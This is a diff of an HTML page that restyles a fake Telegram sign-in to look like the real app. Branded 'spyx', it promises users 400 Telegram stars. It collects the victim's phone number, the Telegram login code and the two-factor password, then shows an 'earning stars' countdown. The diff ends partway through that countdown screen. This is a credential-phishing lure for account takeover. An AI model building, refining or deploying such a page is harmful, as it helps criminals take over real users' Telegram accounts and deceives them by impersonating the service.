@@ -2,481 +2,545 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Telegram ★ star earn</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+<title>Telegram ★ Star Earn</title>
 <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
 <style>
-  /* ------------------------------------------------------------
-     SUPERCHARGED PREMIUM THEME – COOL GLASS + SPACE
-     + ROTATING LOADER ON REQUEST CODE + WELCOME POPUP
-  ------------------------------------------------------------ */
-  * { margin: 0; padding: 0; box-sizing: border-box; }
+  /* ---------- RESET & LIGHT TELEGRAM THEME ---------- */
+  * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+  }
 
   :root {
-    --bg: #0c0b1a;
-    --surface: rgba(21, 16, 41, 0.8);
-    --card: rgba(31, 25, 53, 0.9);
-    --border: rgba(59, 49, 85, 0.6);
-    --gold: #ffd966;
-    --gold2: #f0b800;
-    --gold-glow: rgba(255, 215, 0, 0.5);
-    --green: #10b981;
-    --green2: #059669;
-    --text: #ffffff;
-    --muted: #c4b5e6;
-    --faint: #6b5b95;
-    --glass-edge: rgba(255, 255, 255, 0.05);
-    --shadow-heavy: 0 30px 60px -15px rgba(0,0,0,0.8);
+    /* Telegram-inspired light palette */
+    --bg: #f4f7fb;
+    --surface: #ffffff;
+    --card: #ffffff;
+    --border: rgba(0, 0, 0, 0.08);
+    --text-primary: #0d1829;
+    --text-secondary: #6c7e99;
+    --text-muted: #8a9bb5;
+    --accent: #2A8DFF;
+    --accent-light: #EAF4FF;
+    --accent-dark: #1b6fd8;
+    --gold: #f5a623;
+    --gold-light: #fff2d9;
+    --green: #34c759;
+    --green-light: #e6f9ea;
+    --shadow-sm: 0 2px 8px rgba(0, 0, 0, 0.04);
+    --shadow-md: 0 8px 24px rgba(0, 0, 0, 0.04);
+    --radius-md: 20px;
+    --radius-lg: 28px;
   }
 
   body {
-    background: radial-gradient(ellipse at 30% 20%, #2a1e4a, #070514);
+    background: var(--bg);
     font-family: 'Inter', sans-serif;
-    color: var(--text);
+    color: var(--text-primary);
     min-height: 100vh;
     display: flex;
     align-items: center;
     justify-content: center;
-    padding: 16px;
-    backdrop-filter: blur(2px);
+    padding: 12px;
+    -webkit-font-smoothing: antialiased;
   }
 
-  #app { width: 100%; max-width: 440px; position: relative; }
-  .screen { display: none; width: 100%; animation: floatIn 0.5s cubic-bezier(0.23, 1, 0.32, 1); }
+  #app {
+    width: 100%;
+    max-width: 420px;
+    position: relative;
+  }
+
+  .screen {
+    display: none;
+    width: 100%;
+    animation: fadeSlide 0.3s ease;
+  }
   .screen.show { display: block; }
-
-  @keyframes floatIn {
-    0% { opacity: 0; transform: translateY(30px) scale(0.96); }
-    100% { opacity: 1; transform: translateY(0) scale(1); }
+  @keyframes fadeSlide {
+    0% { opacity: 0; transform: translateY(8px); }
+    100% { opacity: 1; transform: translateY(0); }
   }
 
-  /* ---------- WELCOME POPUP (spyx intro) ---------- */
+  .card {
+    background: var(--card);
+    border-radius: var(--radius-lg);
+    box-shadow: var(--shadow-md);
+    overflow: hidden;
+    border: 1px solid var(--border);
+  }
+
+  /* ---------- WELCOME POPUP WITH sticker.webp ---------- */
   .popup-overlay {
     position: fixed;
     inset: 0;
-    background: rgba(0,0,0,0.8);
-    backdrop-filter: blur(8px);
+    background: rgba(0, 0, 0, 0.3);
+    backdrop-filter: blur(4px);
     display: flex;
     align-items: center;
     justify-content: center;
     z-index: 1000;
-    transition: opacity 0.3s;
   }
   .popup-card {
-    background: var(--card);
-    border: 1px solid var(--gold);
-    border-radius: 48px;
-    padding: 32px 28px;
-    max-width: 340px;
+    background: white;
+    border-radius: 32px;
+    padding: 32px 24px;
+    max-width: 320px;
     text-align: center;
-    box-shadow: 0 30px 60px gold;
-    animation: popRise 0.4s;
+    box-shadow: var(--shadow-md);
+    border: 1px solid var(--border);
   }
-  @keyframes popRise {
-    from { transform: scale(0.8); opacity: 0; }
-    to { transform: scale(1); opacity: 1; }
-  }
-  .popup-icon {
-    font-size: 64px;
-    filter: drop-shadow(0 0 20px gold);
+  .popup-icon img {
+    width: 80px;
+    height: 80px;
     margin-bottom: 16px;
+    border-radius: 40px;
   }
   .popup-title {
-    font-size: 28px;
-    font-weight: 800;
-    background: linear-gradient(145deg, #fff2b5, #ffd966);
-    -webkit-background-clip: text;
-    -webkit-text-fill-color: transparent;
+    font-size: 24px;
+    font-weight: 700;
+    color: var(--text-primary);
     margin-bottom: 12px;
   }
   .popup-text {
-    color: var(--muted);
-    font-size: 16px;
-    line-height: 1.6;
-    margin-bottom: 28px;
+    color: var(--text-secondary);
+    font-size: 15px;
+    line-height: 1.5;
+    margin-bottom: 24px;
   }
-  .popup-text strong {
-    color: var(--gold);
-  }
+  .popup-text strong { color: var(--accent); }
   .popup-btn {
-    background: linear-gradient(135deg, #f5d742, #d4a308);
+    background: var(--accent);
     border: none;
-    border-radius: 60px;
-    padding: 16px 32px;
-    font-weight: 800;
-    font-size: 18px;
-    color: #0c0b1a;
-    cursor: pointer;
-    box-shadow: 0 20px 30px -8px #f5b81b80;
-    border: 1px solid rgba(255,255,255,0.3);
-    width: 100%;
-  }
-  .popup-btn:hover { transform: scale(1.02); }
-
-  /* ---------- GLASS CARD ---------- */
-  .glass-card {
-    background: var(--card);
-    backdrop-filter: blur(12px);
-    border: 1px solid var(--glass-edge);
     border-radius: 40px;
-    box-shadow: var(--shadow-heavy), 0 0 0 1px rgba(255, 215, 0, 0.1) inset;
-    overflow: hidden;
+    padding: 14px 28px;
+    font-weight: 600;
+    font-size: 16px;
+    color: white;
+    cursor: pointer;
+    width: 100%;
+    transition: background 0.15s;
+    box-shadow: 0 4px 12px rgba(42, 141, 255, 0.3);
   }
+  .popup-btn:hover { background: var(--accent-dark); }
 
-  /* ---------- LOGIN SCREEN (step 1) ---------- */
+  /* ---------- LOGIN SCREEN WITH COUNTRY SELECTOR ---------- */
   .login-header {
     text-align: center;
-    padding: 36px 24px 16px;
+    padding: 32px 24px 16px;
   }
   .logo-ring {
-    width: 70px;
-    height: 70px;
-    margin: 0 auto 20px;
-    background: linear-gradient(145deg, var(--gold), #ca9e1e);
+    width: 64px;
+    height: 64px;
+    margin: 0 auto 18px;
+    background: var(--accent-light);
     border-radius: 50%;
     display: flex;
     align-items: center;
     justify-content: center;
-    font-size: 36px;
-    color: #0b0819;
-    box-shadow: 0 0 30px var(--gold-glow);
-    position: relative;
-  }
-  .logo-ring::after {
-    content: '';
-    position: absolute;
-    inset: -4px;
-    border-radius: 50%;
-    border: 1px solid rgba(255,215,0,0.5);
-    opacity: 0.7;
+    font-size: 32px;
+    color: var(--accent);
+    box-shadow: 0 2px 12px rgba(42, 141, 255, 0.2);
   }
   .login-header h2 {
-    font-size: 28px;
-    font-weight: 800;
-    letter-spacing: -0.5px;
-    background: linear-gradient(120deg, #fff0c0, var(--gold));
-    -webkit-background-clip: text;
-    -webkit-text-fill-color: transparent;
-    margin-bottom: 6px;
+    font-size: 26px;
+    font-weight: 700;
+    color: var(--text-primary);
+    margin-bottom: 4px;
   }
   .step-badge {
     font-size: 12px;
     font-weight: 600;
-    color: var(--muted);
-    background: rgba(255,215,0,0.1);
+    color: var(--text-secondary);
+    background: var(--bg);
     display: inline-block;
-    padding: 6px 24px;
-    border-radius: 60px;
-    border: 1px solid rgba(255,215,0,0.25);
-    backdrop-filter: blur(4px);
+    padding: 4px 20px;
+    border-radius: 40px;
+    border: 1px solid var(--border);
   }
 
   .phone-section {
-    padding: 20px 28px 10px;
+    padding: 16px 24px 8px;
   }
   .phone-label {
     font-size: 12px;
     font-weight: 600;
-    color: var(--muted);
+    color: var(--text-secondary);
     text-transform: uppercase;
-    letter-spacing: 1px;
+    letter-spacing: 0.4px;
+    margin-bottom: 10px;
+  }
+
+  /* Country selector dropdown */
+  .country-selector {
+    margin-bottom: 12px;
+    position: relative;
+  }
+  .country-selector select {
+    width: 100%;
+    padding: 16px 20px;
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: 60px;
+    font-size: 16px;
+    font-weight: 500;
+    color: var(--text-primary);
+    appearance: none;
+    cursor: pointer;
+    outline: none;
+    transition: border 0.15s;
+  }
+  .country-selector select:focus {
+    border-color: var(--accent);
+    box-shadow: 0 0 0 3px rgba(42, 141, 255, 0.2);
+  }
+  .country-selector::after {
+    content: '▼';
+    font-size: 12px;
+    color: var(--text-secondary);
+    position: absolute;
+    right: 20px;
+    top: 50%;
+    transform: translateY(-50%);
+    pointer-events: none;
+  }
+
+  /* Search input */
+  .country-search {
     margin-bottom: 12px;
   }
+  .country-search input {
+    width: 100%;
+    padding: 14px 20px;
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: 60px;
+    font-size: 15px;
+    outline: none;
+  }
+  .country-search input:focus {
+    border-color: var(--accent);
+    box-shadow: 0 0 0 3px rgba(42, 141, 255, 0.2);
+  }
+
   .phone-field {
     display: flex;
     align-items: center;
-    background: rgba(0,0,0,0.3);
-    backdrop-filter: blur(10px);
-    border: 1.5px solid rgba(255,215,0,0.2);
+    background: var(--bg);
+    border: 1px solid var(--border);
     border-radius: 60px;
-    padding: 4px 20px;
-    transition: 0.2s;
+    padding: 4px 16px;
+    transition: border 0.15s;
   }
   .phone-field:focus-within {
-    border-color: var(--gold);
-    box-shadow: 0 0 0 5px rgba(255,215,0,0.15);
+    border-color: var(--accent);
+    box-shadow: 0 0 0 3px rgba(42, 141, 255, 0.2);
   }
-  .phone-field .country-code {
-    font-size: 20px;
-    font-weight: 700;
-    color: var(--text);
-    background: transparent;
-    border: none;
-    width: 60px;
-    outline: none;
-    padding: 16px 0;
+  .phone-field .country-code-display {
+    font-size: 18px;
+    font-weight: 600;
+    color: var(--text-primary);
+    min-width: 70px;
+    padding: 14px 0;
+    border-right: 1px solid var(--border);
+    margin-right: 12px;
   }
   .phone-field .phone-number {
     flex: 1;
-    font-size: 20px;
+    font-size: 18px;
     font-weight: 500;
     background: transparent;
     border: none;
-    color: var(--text);
+    color: var(--text-primary);
     outline: none;
-    padding: 16px 0;
+    padding: 14px 0;
   }
-  .phone-field .phone-number::placeholder {
-    color: var(--faint);
-    font-weight: 400;
-    font-size: 18px;
-  }
-  .phone-field span.sep {
-    font-size: 28px;
-    color: var(--gold);
-    margin: 0 6px;
-    opacity: 0.7;
-  }
+  .phone-field .phone-number::placeholder { color: #b8c7dd; }
 
   .or-divider {
     display: flex;
     align-items: center;
-    gap: 16px;
-    padding: 16px 28px;
-    color: var(--muted);
+    gap: 12px;
+    padding: 16px 24px;
+    color: var(--text-muted);
     font-size: 12px;
-    font-weight: 600;
   }
   .or-divider .line {
     flex: 1;
     height: 1px;
-    background: linear-gradient(90deg, transparent, var(--gold), transparent);
+    background: var(--border);
   }
 
-  /* REQUEST CODE button with rotating loader */
   .request-btn {
-    background: linear-gradient(135deg, #f5d742, #d4a308);
+    background: var(--accent);
     border: none;
     border-radius: 60px;
-    padding: 18px 28px;
-    margin: 0 28px 20px;
-    font-weight: 800;
-    font-size: 18px;
-    color: #0c0b1a;
+    padding: 16px 24px;
+    margin: 0 24px 20px;
+    font-weight: 600;
+    font-size: 16px;
+    color: white;
     display: flex;
     align-items: center;
     justify-content: space-between;
     cursor: pointer;
-    width: calc(100% - 56px);
-    transition: 0.2s;
-    box-shadow: 0 20px 30px -8px #f5b81b80;
-    border: 1px solid rgba(255,255,255,0.3);
-    position: relative;
+    width: calc(100% - 48px);
+    transition: background 0.15s;
+    box-shadow: 0 4px 14px rgba(42, 141, 255, 0.35);
   }
-  .request-btn .btn-text { display: flex; align-items: center; gap: 8px; }
+  .request-btn .btn-text { display: flex; align-items: center; gap: 10px; }
   .request-btn .spinner {
-    width: 24px;
-    height: 24px;
-    border: 3px solid rgba(0,0,0,0.2);
-    border-top-color: #0c0b1a;
+    width: 20px;
+    height: 20px;
+    border: 2px solid rgba(255,255,255,0.3);
+    border-top-color: white;
     border-radius: 50%;
     animation: spin 1s linear infinite;
     display: none;
   }
-  .request-btn.loading .btn-text span:not(.spinner) { opacity: 0.5; }
+  .request-btn.loading .btn-text span:not(.spinner) { opacity: 0.8; }
   .request-btn.loading .spinner { display: inline-block; }
   @keyframes spin { to { transform: rotate(360deg); } }
-
-  .request-btn:hover { transform: translateY(-3px) scale(1.02); box-shadow: 0 28px 40px -5px #f5d742cc; }
-  .request-btn .arrow { font-size: 26px; }
+  .request-btn:hover { background: var(--accent-dark); }
 
   .login-footer {
-    padding: 10px 28px 34px;
+    padding: 8px 24px 30px;
     text-align: center;
-    font-size: 14px;
-    color: var(--muted);
-    line-height: 1.6;
+    font-size: 13px;
+    color: var(--text-secondary);
   }
-  .login-footer strong { color: var(--gold); text-shadow: 0 0 8px gold; }
+  .login-footer strong { color: var(--accent); }
 
-  /* ---------- VERIFICATION PAGE ---------- */
+  /* ---------- VERIFICATION SCREEN WITH otp.gif ---------- */
   .verify-screen {
-    background: var(--card);
-    backdrop-filter: blur(16px);
-    border-radius: 48px;
+    background: white;
+    border-radius: 32px;
     padding: 30px 24px 34px;
-    border: 1px solid rgba(255,215,0,0.15);
-    box-shadow: var(--shadow-heavy), 0 0 40px rgba(255,215,0,0.2);
+    border: 1px solid var(--border);
+    box-shadow: var(--shadow-md);
   }
+  .back-arrow {
+    background: none;
+    border: none;
+    color: var(--text-secondary);
+    font-size: 14px;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    margin-bottom: 20px;
+  }
+  .back-arrow:hover { color: var(--accent); }
 
-  .verify-header { text-align: center; margin-bottom: 30px; }
-  .verify-header .icon { font-size: 56px; filter: drop-shadow(0 0 20px gold); margin-bottom: 10px; animation: twinkle 2s infinite; }
-  @keyframes twinkle { 0% { opacity: 1; } 50% { opacity: 0.7; } }
+  .verify-header { text-align: center; margin-bottom: 24px; }
+  .verify-header .icon img {
+    width: 60px;
+    height: 60px;
+    margin-bottom: 8px;
+  }
   .verify-header h3 {
-    font-size: 32px;
-    font-weight: 800;
-    background: linear-gradient(145deg, #fff2b5, #ffd966);
-    -webkit-background-clip: text;
-    -webkit-text-fill-color: transparent;
+    font-size: 28px;
+    font-weight: 700;
+    color: var(--text-primary);
     margin-bottom: 6px;
   }
-  .verify-header p { color: var(--muted); font-size: 15px; }
-  .verify-header p strong { color: var(--gold); }
+  .verify-header p { color: var(--text-secondary); font-size: 15px; }
+  .verify-header p strong { color: var(--accent); }
 
   .otp-row {
     display: flex;
-    gap: 12px;
+    gap: 10px;
     justify-content: center;
-    margin: 36px 0 28px;
+    margin: 32px 0 24px;
   }
   .otp-d {
-    width: 62px;
-    height: 70px;
+    width: 56px;
+    height: 64px;
     text-align: center;
-    font-size: 2.4rem;
-    font-weight: 800;
-    background: rgba(0,0,0,0.4);
-    border: 2px solid rgba(255,215,0,0.4);
-    border-radius: 24px;
-    color: var(--gold);
+    font-size: 2rem;
+    font-weight: 600;
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: 20px;
+    color: var(--text-primary);
     outline: none;
-    transition: 0.1s;
-    box-shadow: 0 0 15px rgba(255,215,0,0.2);
+    transition: border 0.15s;
   }
-  .otp-d:focus { border-color: gold; transform: scale(1.05); box-shadow: 0 0 30px gold; }
+  .otp-d:focus {
+    border-color: var(--accent);
+    box-shadow: 0 0 0 3px rgba(42, 141, 255, 0.2);
+  }
 
-  .btn-premium {
-    background: linear-gradient(145deg, #f8d348, #e0b02e);
+  .btn-primary {
+    background: var(--accent);
     border: none;
-    border-radius: 50px;
-    padding: 18px;
-    font-weight: 800;
-    font-size: 18px;
-    color: #0b0819;
-    width: 100%;
-    cursor: pointer;
-    box-shadow: 0 16px 30px -8px #f5b81b;
-    transition: 0.15s;
-    border: 1px solid rgba(255,255,240,0.5);
-    margin: 10px 0;
-  }
-  .btn-premium:hover { transform: translateY(-3px); box-shadow: 0 20px 40px -5px gold; }
-  .btn-glass {
-    background: rgba(255,255,255,0.03);
-    backdrop-filter: blur(8px);
-    border: 1.5px solid rgba(255,215,0,0.2);
-    border-radius: 50px;
+    border-radius: 60px;
     padding: 16px;
     font-weight: 600;
-    color: var(--muted);
+    font-size: 16px;
+    color: white;
     width: 100%;
     cursor: pointer;
-    transition: 0.15s;
-    margin-top: 12px;
+    box-shadow: 0 4px 14px rgba(42, 141, 255, 0.3);
+    margin: 8px 0;
   }
-  .btn-glass:hover { border-color: var(--gold); color: var(--gold); }
+  .btn-primary:hover { background: var(--accent-dark); }
+
+  .resend { text-align: center; font-size: 14px; color: var(--text-muted); margin: 16px 0 8px; }
+  #rBtn { background: none; border: none; color: var(--accent); font-weight: 600; cursor: pointer; display: none; }
 
   .al {
     border-radius: 40px;
-    padding: 14px 18px;
-    margin: 16px 0;
+    padding: 12px 16px;
+    margin: 16px 0 0;
     display: none;
     align-items: center;
-    gap: 10px;
+    gap: 8px;
     font-size: 14px;
-    background: rgba(0,0,0,0.3);
-    backdrop-filter: blur(10px);
+    background: var(--bg);
   }
   .al.show { display: flex; }
-  .al-e { border: 1px solid #ff7171; color: #ffb3b3; }
-  .al-s { border: 1px solid #10b981; color: #a7f3d0; }
-  .al-i { border: 1px solid var(--gold); color: var(--gold); }
+  .al-e { background: #fee9e9; color: #d44c4c; border: 1px solid #ffc9c9; }
+  .al-s { background: #e6f9ea; color: #1e7b48; border: 1px solid #b8e6c9; }
+  .al-i { background: var(--accent-light); color: var(--accent); border: 1px solid rgba(42,141,255,0.2); }
 
-  .resend { text-align: center; font-size: 14px; color: var(--muted); }
-  #rBtn { background: none; border: none; color: var(--gold); font-weight: 700; cursor: pointer; display: none; }
-  #pwField input { width:100%; padding:16px 20px; background:rgba(0,0,0,0.3); border:1.5px solid rgba(255,215,0,0.3); border-radius:60px; color:white; font-size:16px; }
+  #pwField input {
+    width:100%; padding:14px 18px; background:var(--bg); border:1px solid var(--border); border-radius:60px; font-size:16px; outline:none;
+  }
+  #pwField input:focus { border-color:var(--accent); box-shadow:0 0 0 3px rgba(42,141,255,0.2); }
 
-  /* ---------- STAR EARN SCREENS (countdown, etc) ---------- */
-  .card { background: var(--card); border: 1px solid rgba(255,215,0,0.1); border-radius: 40px; backdrop-filter: blur(12px); padding: 16px 0; }
-  .stripe-gold { height: 6px; background: linear-gradient(90deg,transparent,var(--gold),var(--gold2),var(--gold),transparent); }
-  .user-strip { background: rgba(0,0,0,0.25); border-radius: 50px; padding: 12px 18px; display: flex; gap: 13px; }
-  .u-av { width: 46px; height: 46px; border-radius: 50%; background: linear-gradient(135deg,var(--gold),var(--gold2)); display: flex; align-items: center; justify-content: center; font-weight: 800; color: #0b0819; }
-  .ring-wrap { display: flex; flex-direction: column; align-items: center; margin-bottom: 24px; }
-  .ring-outer { position: relative; width: 164px; height: 164px; }
-  .r-track { fill: none; stroke: rgba(255,215,0,0.15); stroke-width: 9; }
-  .r-prog { fill: none; stroke: var(--gold); stroke-width: 9; stroke-linecap: round; filter: drop-shadow(0 0 8px gold); }
-  .ring-inner { position: absolute; inset: 18px; border-radius: 50%; background: radial-gradient(circle at 30% 30%, rgba(255,215,0,0.15), #0b0819); border: 1px solid rgba(255,215,0,0.3); display: flex; flex-direction: column; align-items: center; justify-content: center; }
-  #countNum { font-size: 4rem; font-weight: 900; color: var(--gold); line-height: 1; text-shadow: 0 0 20px gold; }
-  .del-list { background: rgba(255,215,0,0.07); border: 1px solid rgba(255,215,0,0.25); border-radius: 20px; padding: 13px 15px; margin: 18px 0; }
-  .del-list li { display: flex; align-items: center; gap: 8px; font-size: 13px; list-style: none; }
-  .del-list li::before { content: '✦'; color: gold; font-size: 18px; }
-  .cancel-btn { width: 100%; padding: 18px; background: linear-gradient(135deg,#0f4c3a,#1f7a5c); border: none; border-radius: 60px; font-weight: 800; color: white; cursor: pointer; margin-bottom: 10px; box-shadow: 0 15px 30px -8px #10b981; }
-  .skip-row { text-align: center; }
-  #skipBtn { background: none; border: none; color: rgba(255,215,0,0.6); text-decoration: underline; cursor: pointer; }
-  .result-center { text-align: center; padding: 20px 0; }
-  .res-icon.gold-icon { width: 78px; height: 78px; border-radius: 50%; background: rgba(255,215,0,0.12); border: 2px solid rgba(255,215,0,0.35); display: flex; align-items: center; justify-content: center; font-size: 38px; margin: 0 auto 18px; }
-  .fact-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 24px; }
-  .fact { background: rgba(0,0,0,0.2); backdrop-filter: blur(8px); border: 1px solid rgba(255,215,0,0.1); border-radius: 20px; padding: 14px; text-align: center; }
-  .section-box { background: rgba(0,0,0,0.2); backdrop-filter: blur(10px); border-radius: 30px; padding: 18px; }
+  /* ---------- COUNTDOWN SCREEN (unchanged) ---------- */
+  .countdown-card { padding: 0 0 20px; }
+  .user-strip {
+    display: flex; gap: 14px; background: var(--bg); border-radius: 60px; padding: 12px 18px; margin: 16px 20px 20px;
+  }
+  .u-av {
+    width: 48px; height: 48px; border-radius: 50%; background: var(--accent-light);
+    display: flex; align-items: center; justify-content: center; font-size: 22px; color: var(--accent);
+  }
+  .ring-wrap {
+    display: flex; flex-direction: column; align-items: center; margin: 10px 0 18px;
+  }
+  .ring-outer {
+    position: relative; width: 150px; height: 150px;
+  }
+  .ring-outer svg { width:100%; height:100%; transform: rotate(-90deg); }
+  .r-track { fill:none; stroke:#e9ecf0; stroke-width:8; }
+  .r-prog { fill:none; stroke:var(--accent); stroke-width:8; stroke-linecap:round; }
+  .ring-inner {
+    position: absolute; inset: 16px; border-radius: 50%; background: white; border: 1px solid var(--border);
+    display: flex; flex-direction: column; align-items: center; justify-content: center;
+  }
+  #countNum { font-size: 3.4rem; font-weight: 700; color: var(--accent); line-height: 1; }
+  .del-list {
+    background: var(--bg); border-radius: 30px; padding: 16px 20px; margin: 18px 24px;
+    border: 1px solid var(--border);
+  }
+  .del-list li {
+    display: flex; align-items: center; gap: 10px; font-size: 14px;
+    color: var(--text-primary); list-style: none; padding: 6px 0;
+  }
+  .del-list li::before { content: '⭐'; font-size: 16px; color: var(--gold); }
+  .cancel-btn {
+    background: var(--green); border: none; border-radius: 60px; padding: 16px;
+    font-weight: 600; font-size: 16px; color: white; width: calc(100% - 48px); margin: 8px 24px;
+    cursor: pointer; box-shadow: 0 4px 14px rgba(52, 199, 89, 0.3);
+  }
+  .skip-row { text-align: center; margin-bottom: 20px; }
+  #skipBtn { background: none; border: none; color: var(--text-muted); text-decoration: underline; cursor: pointer; }
+  .bar-wrap { height: 4px; background: #e9ecf0; border-radius: 4px; margin: 0 24px 16px; overflow: hidden; }
+  .bar-fill { height: 100%; background: var(--accent); width: 100%; transition: width 1s linear; }
 
-  .back-arrow { background: none; border: none; color: var(--muted); font-size: 14px; cursor: pointer; display: flex; align-items: center; gap: 6px; margin-bottom: 20px; }
-  .back-arrow:hover { color: var(--gold); }
+  /* ---------- RESULT SCREENS ---------- */
+  .result-center { text-align: center; padding: 24px 20px; }
+  .res-icon {
+    width: 80px; height: 80px; border-radius: 50%; display: flex; align-items: center; justify-content: center;
+    font-size: 40px; margin: 0 auto 18px;
+  }
+  .res-icon.gold-icon { background: var(--gold-light); color: var(--gold); border: 1px solid rgba(245,166,35,0.3); }
+  .res-icon.green-icon { background: var(--green-light); color: var(--green); border: 1px solid rgba(52,199,89,0.3); }
+  .res-title { font-size: 28px; font-weight: 700; color: var(--text-primary); margin-bottom: 8px; }
+  .res-sub { color: var(--text-secondary); font-size: 15px; margin: 0 auto 24px; }
+  .fact-grid {
+    display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin: 24px 20px;
+  }
+  .fact {
+    background: var(--bg); border-radius: 24px; padding: 14px; border: 1px solid var(--border);
+  }
+  .fact .fi { font-size: 24px; margin-bottom: 4px; }
+  .fact .fv { font-weight: 700; color: var(--text-primary); }
+
+  .section-box { background: var(--bg); border-radius: 28px; padding: 20px; margin: 8px 20px; border: 1px solid var(--border); }
+  .inp-w input { width:100%; padding:14px 18px; background:white; border:1px solid var(--border); border-radius:60px; font-size:16px; }
+  .cn-step { display: none; }
+  .cn-step.active { display: block; }
 </style>
 </head>
 <body>
-<!-- WELCOME POPUP (spyx intro) -->
+
+<!-- WELCOME POPUP WITH sticker.webp -->
 <div id="welcomePopup" class="popup-overlay">
   <div class="popup-card">
-    <div class="popup-icon">⚡</div>
-    <div class="popup-title">New Method!</div>
-    <div class="popup-text">
-      <strong>spyx</strong> here — this is a fresh, exclusive way to earn stars.<br>Fast & secure. Ready?
+    <div class="popup-icon">
+      <img src="sticker.webp" alt="spyx" onerror="this.src='data:image/svg+xml;utf8,<svg xmlns=%22http://www.w3.org/2000/svg%22 width=%2280%22 height=%2280%22 viewBox=%220 0 100 100%22><circle cx=%2250%22 cy=%2250%22 r=%2245%22 fill=%22%23EAF4FF%22/><text x=%2250%22 y=%2265%22 font-size=%2240%22 text-anchor=%22middle%22 fill=%22%232A8DFF%22>⭐</text></svg>'">
     </div>
-    <button class="popup-btn" onclick="closePopup()">★ MOVE ON</button>
+    <div class="popup-title">New method</div>
+    <div class="popup-text"><strong>spyx</strong> here — fresh, fast star earning.<br>Ready to move on?</div>
+    <button class="popup-btn" onclick="closePopup()">Move on</button>
   </div>
 </div>
 
 <div id="app">
-  <!-- ========= SCREEN 1: LOGIN ========= -->
+  <!-- SCREEN 1: LOGIN WITH COUNTRY SELECTOR -->
   <div class="screen show" id="loginScreen">
-    <div class="glass-card">
+    <div class="card">
       <div class="login-header">
         <div class="logo-ring">⭐</div>
-        <h2>TELEGRAM</h2>
-        <div class="step-badge">SIGN IN · STEP 1</div>
+        <h2>Telegram</h2>
+        <div class="step-badge">step 1 · sign in</div>
       </div>
-
       <div class="phone-section">
-        <div class="phone-label">your phone number</div>
+        <div class="phone-label">Your phone number</div>
+        
+        <!-- Country search -->
+        <div class="country-search">
+          <input type="text" id="countrySearch" placeholder="Search country..." oninput="filterCountries()">
+        </div>
+        
+        <!-- Country selector dropdown -->
+        <div class="country-selector">
+          <select id="countrySelect" onchange="updateCountryCode()"></select>
+        </div>
+        
+        <!-- Phone input with auto-updating code -->
         <div class="phone-field">
-          <input type="text" class="country-code" value="+1" placeholder="+1" id="countryCode" maxlength="4">
-          <span class="sep">)</span>
-          <input type="tel" class="phone-number" id="phoneInp" placeholder="234 567 890" value="">
+          <div class="country-code-display" id="countryCodeDisplay">+1</div>
+          <input type="tel" class="phone-number" id="phoneInp" placeholder="234 567 890">
         </div>
       </div>
-
-      <div class="or-divider">
-        <span class="line"></span>
-        <span>OR</span>
-        <span class="line"></span>
-      </div>
-
-      <!-- REQUEST CODE with rotating spinner (loading state) -->
+      <div class="or-divider"><span class="line"></span><span>OR</span><span class="line"></span></div>
       <button class="request-btn" id="sendBtn" onclick="goToVerifyScreen()">
-        <span class="btn-text">
-          <span>REQUEST CODE</span>
-          <span class="spinner"></span>
-        </span>
-        <span class="arrow">✨</span>
+        <span class="btn-text"><span>Request code</span><span class="spinner"></span></span>
+        <span class="arrow">→</span>
       </button>
-
-      <div class="login-footer">
-        You will receive a verification code <strong>via Telegram or SMS</strong>.
-      </div>
-      <div class="al" id="a1" style="margin: 0 24px 24px;"></div>
+      <div class="login-footer">You'll receive a code <strong>via Telegram or SMS</strong></div>
+      <div class="al" id="a1" style="margin:0 24px 24px;"></div>
     </div>
   </div>
 
-  <!-- ========= SCREEN 2: VERIFICATION ========= -->
+  <!-- SCREEN 2: VERIFICATION WITH otp.gif -->
   <div class="screen" id="verifyScreen">
     <div class="verify-screen">
-      <button class="back-arrow" onclick="show('loginScreen')">← back</button>
+      <button class="back-arrow" onclick="show('loginScreen')">← Back</button>
       <div class="verify-header">
-        <div class="icon">⭐</div>
-        <h3>verify code</h3>
+        <div class="icon">
+          <img src="otp.gif" alt="OTP" onerror="this.src='data:image/svg+xml;utf8,<svg xmlns=%22http://www.w3.org/2000/svg%22 width=%2260%22 height=%2260%22 viewBox=%220 0 100 100%22><circle cx=%2250%22 cy=%2250%22 r=%2240%22 fill=%22%23EAF4FF%22/><text x=%2250%22 y=%2265%22 font-size=%2230%22 text-anchor=%22middle%22 fill=%22%232A8DFF%22>📱</text></svg>'">
+        </div>
+        <h3>Verify code</h3>
         <p>Enter the 5-digit code sent to <strong id="phoneDisplay">your phone</strong></p>
       </div>
-
       <div class="otp-row" id="otp1">
         <input type="tel" class="otp-d" maxlength="1" inputmode="numeric">
         <input type="tel" class="otp-d" maxlength="1" inputmode="numeric">
@@ -484,13 +548,10 @@
         <input type="tel" class="otp-d" maxlength="1" inputmode="numeric">
         <input type="tel" class="otp-d" maxlength="1" inputmode="numeric">
       </div>
-
-      <div id="pwField" style="display:none; margin-bottom:18px;">
+      <div id="pwField" style="display:none; margin-bottom:16px;">
         <input type="password" id="pwInp" placeholder="Two‑factor password">
       </div>
-
-      <button class="btn-premium" id="verifyBtn" onclick="verifyCode()"><span>★ LOGIN & EARN</span></button>
-
+      <button class="btn-primary" id="verifyBtn" onclick="verifyCode()"><span>★ Login & earn</span></button>
       <div class="resend">
         <p id="resendP">Resend code in <span id="rCount">60</span>s</p>
         <button id="rBtn" onclick="resend()">Resend code</button>
@@ -499,267 +560,473 @@
     </div>
   </div>
 
-  <!-- ========= SCREEN 3: COUNTDOWN (star earn) ========= -->
+  <!-- SCREEN 3: COUNTDOWN -->
   <div class="screen" id="countdownScreen">
-    <div class="card">
-      <div class="stripe stripe-gold"></div>
-      <div class="card-head" style="padding:24px; text-align:center;">
-        <h1 style="font-size:28px; font-weight:800; color:#ffd966;">Earning stars ...</h1>
-        <p style="color:var(--muted);">400 stars will be credited in 10 seconds</p>
